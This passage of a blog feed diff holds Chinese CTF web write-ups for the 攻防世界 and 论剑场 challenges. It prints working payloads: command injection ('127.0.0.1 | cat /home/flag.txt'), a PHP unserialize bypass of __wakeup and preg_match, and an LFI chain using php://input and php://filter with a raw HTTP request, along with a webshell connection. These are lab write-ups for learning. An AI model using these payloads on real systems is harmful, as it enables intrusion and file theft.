-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creffer1.png" alt=""></p>
-<p>2.接着继续在请求头内添加Referer: <a href="https://www.google.com，可获得flag" target="_blank" rel="noopener">https://www.google.com，可获得flag</a></p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creffer2.png" alt=""></p>
-<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>1.直接提示给了php一句话，可以用菜刀或蚁剑连接,此处用蚁剑链接:</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwebshell.png" alt=""></p>
-<p>2.连接后在网站目录下发现了flag.txt文件，查看文件可获得flag</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwebshell2.png" alt=""></p>
-<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>1.打开浏览器，在文本框内输入127.0.0.1 | find / -name “flag.txt” （将 | 替换成 &amp; 或 &amp;&amp; 都可以）,查找flag所在位置，如图所示。</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cconnnect1.png" alt=""></p>
-<p>2.在文本框内输入 127.0.0.1 | cat /home/flag.txt 可得到flag，如图所示。</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cconnect2.png" alt=""></p>
-<h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>1.打开页面，查看源代码，可以发现js代码，</p>
-<p>2.进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 fromCharCode 。</p>
-<p>3.先将字符串用python处理一下，得到数组[55,56,54,79,115,69,114,116,107,49,50]，exp如下。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string = <span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line">s = string.split(<span class="string">","</span>)</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    i = chr(int(i))</span><br><span class="line">    c = c+i</span><br><span class="line"><span class="keyword">print</span>(c)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Web-php-unserialize5"><a href="#Web-php-unserialize5" class="headerlink" title="Web php unserialize5"></a>Web php unserialize5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>主要是两个点:<br>1.preg_match(’/[oc]:\d+:/i’, $var)的绕过<br>2.unserialize时__wakeup的绕过<br>这里给出脚本,没有什么难点,就是两个小技巧:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A = <span class="keyword">new</span> Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">    $C = serialize($A);</span><br><span class="line">    <span class="comment">//string(49) "O:4:"Demo":1:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    $C = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$C);<span class="comment">//绕过preg_match</span></span><br><span class="line">    $C = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>,$C);<span class="comment">//绕过wakeup</span></span><br><span class="line">    var_dump($C);</span><br><span class="line">    <span class="comment">//string(49) "O:+4:"Demo":2:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    var_dump(base64_encode($C));</span><br><span class="line">    <span class="comment">//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>payload:</p>
-<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?<span class="keyword">var</span>=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
-<p>得到flag:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>攻防世界writeup</title>
+      <link href="/2020/01/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_writeup/"/>
+      <url>/2020/01/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_writeup/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>攻防世界 web writeup</p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cview_source1.png" alt=""></p><p>Fn12</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cview_source2.png" alt=""></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>1.根据提示robots,可以直接想到robots.txt</p><p>访问<a href="http://111.198.29.45:33982/robots.txt发现f1ag_1s_h3re.php" target="_blank" rel="noopener">http://111.198.29.45:33982/robots.txt发现f1ag_1s_h3re.php</a></p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Crobots1.png" alt=""></p><p>2.访问<a href="http://111.198.29.45:33982/f1ag_1s_h3re.php得到flag" target="_blank" rel="noopener">http://111.198.29.45:33982/f1ag_1s_h3re.php得到flag</a></p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Crobots2.png" alt=""></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>掌握有关备份文件的知识</p><p>常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history</p><p>访问url/index.php.bak</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>1.浏览器按下F12键打开开发者工具，刷新后，在存储一栏，可看到名为look-here的cookie的值为cookie.php</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccookie1.png" alt=""></p><p>2.访问<a href="http://111.198.29.45:47911/cookie.php，提示查看http响应包，在网络一栏，可看到访问cookie.php的数据包" target="_blank" rel="noopener">http://111.198.29.45:47911/cookie.php，提示查看http响应包，在网络一栏，可看到访问cookie.php的数据包</a></p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccooki21.png" alt=""></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>1.打开开发者工具，在查看器窗口审查元素，发现存在disabled=””字段</p><p>2.将disabled=””删除后，按钮可按，按下后得到flag</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cdisableedbutton.png" alt=""></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C1.png" alt=""></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>1.打开页面，进行代码审计，发现同时满足 $a==0 和 $a 时，显示flag1。</p><p>2.php中的弱类型比较会使’abc’ == 0为真，所以输入a=abc时，可得到flag1，如图所示。（abc可换成任意字符）。</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csimple_php.png" alt=""></p><p>3.is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真，所以当输入a=abc&amp;b=1235a，可得到flag2，如图所示。</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csimple_php2.png" alt=""></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>按照题目先用get方式提交a=1</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cget_post1.png" alt=""></p><p>再用post方式提交b=2</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cget_post2.png" alt=""></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>1.打开firefox和burp，使用burp对firefox进行代理拦截，在请求头添加X-Forwarded-For: 123.123.123.123，然后放包</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creffer1.png" alt=""></p><p>2.接着继续在请求头内添加Referer: <a href="https://www.google.com，可获得flag" target="_blank" rel="noopener">https://www.google.com，可获得flag</a></p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creffer2.png" alt=""></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>1.直接提示给了php一句话，可以用菜刀或蚁剑连接,此处用蚁剑链接:</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwebshell.png" alt=""></p><p>2.连接后在网站目录下发现了flag.txt文件，查看文件可获得flag</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwebshell2.png" alt=""></p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>1.打开浏览器，在文本框内输入127.0.0.1 | find / -name “flag.txt” （将 | 替换成 &amp; 或 &amp;&amp; 都可以）,查找flag所在位置，如图所示。</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cconnnect1.png" alt=""></p><p>2.在文本框内输入 127.0.0.1 | cat /home/flag.txt 可得到flag，如图所示。</p><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cconnect2.png" alt=""></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>1.打开页面，查看源代码，可以发现js代码，</p><p>2.进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 fromCharCode 。</p><p>3.先将字符串用python处理一下，得到数组[55,56,54,79,115,69,114,116,107,49,50]，exp如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line">s = string.split(<span class="string">","</span>)</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    i = chr(int(i))</span><br><span class="line">    c = c+i</span><br><span class="line"><span class="keyword">print</span>(c)</span><br></pre></td></tr></table></figure><h2 id="Web-php-unserialize5"><a href="#Web-php-unserialize5" class="headerlink" title="Web php unserialize5"></a>Web php unserialize5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>主要是两个点:<br>1.preg_match(’/[oc]:\d+:/i’, $var)的绕过<br>2.unserialize时__wakeup的绕过<br>这里给出脚本,没有什么难点,就是两个小技巧:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A = <span class="keyword">new</span> Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">    $C = serialize($A);</span><br><span class="line">    <span class="comment">//string(49) "O:4:"Demo":1:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    $C = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$C);<span class="comment">//绕过preg_match</span></span><br><span class="line">    $C = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>,$C);<span class="comment">//绕过wakeup</span></span><br><span class="line">    var_dump($C);</span><br><span class="line">    <span class="comment">//string(49) "O:+4:"Demo":2:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    var_dump(base64_encode($C));</span><br><span class="line">    <span class="comment">//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?<span class="keyword">var</span>=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure><p>得到flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>writeup</category>
+          
+          <category> writeup </category>
+          
       </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>论剑场_writeup</title>
-    <url>/2020/01/18/%E8%AE%BA%E5%89%91%E5%9C%BA_writeup/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>新bugku_writeup</p>
-<a id="more"></a>
-
-<h1 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h1><p>打开网页显示：</p>
-<p>you are not admin !</p>
-<p>F12查看发现注释掉的PHP代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看到<code>file_get_contents()</code>函数推测可能存在文件包含(参看LFI（Local File Include）漏洞学习)，利用姿势如下:</p>
-<ul>
-<li>利用<code>php://inpu</code>t和POST发包<code>admin</code>绕过<code>filegetcontents($user,&#39;r&#39;)===&quot;admin&quot;)</code>。</li>
-</ul>
-<ul>
-<li>利用<code>php://filter/read=convert.base64-encode/resource=class.php</code>来读取class.php。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span></span><br></pre></td></tr></table></figure>
-
-
-<p>得到回显:</p>
-<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">hello admin!</span><br><span class="line">PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSk7DQogDQpjbGFzcyBSZWFkey8vZjFhOS5waHANCiAgICBwdWJsaWMgJGZpbGU7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsNCiAgICAgICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmZpbGUpOyAgICANCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIl9fdG9TdHJpbmcgd2FzIGNhbGxlZCEiOw0KICAgIH0NCn0NCj8+</span><br></pre></td></tr></table></figure>
-
-<p>Base64解密得到class.php：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;										<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">			&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        	&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意到 <code>__toString()</code>函数执行时会读取并打印 <code>$this-&gt;file</code>的内容，构造序列化脚本：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line">$payload = <span class="keyword">new</span> Read();</span><br><span class="line">$payload-&gt;file = <span class="string">'f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($payload);</span><br><span class="line"><span class="comment">//O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>赋值给<code>pass</code>当作为字符串是将调用<code>__toString()</code>读取f1a9.php的内容，Payload：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=class.php&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>请求包：</p>
-<pre><code>POST /index.php?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;} HTTP/1.1
-Host: 123.206.31.85:10021
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 5
-Origin: http://123.206.31.85:10021
-Connection: close
-Referer: http://123.206.31.85:10021/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;}
-Cookie: PHPSESSID=273219g1daais8g64fpuuik6t5j0r4br
-Upgrade-Insecure-Requests: 1
-
-admin</code></pre><p>在返回包的网页查看源码即可见到：</p>
-<pre><code>flag{db2699f21f433a78}</code></pre>]]></content>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>论剑场_writeup</title>
+      <link href="/2020/01/18/%E8%AE%BA%E5%89%91%E5%9C%BA_writeup/"/>
+      <url>/2020/01/18/%E8%AE%BA%E5%89%91%E5%9C%BA_writeup/</url>
+      
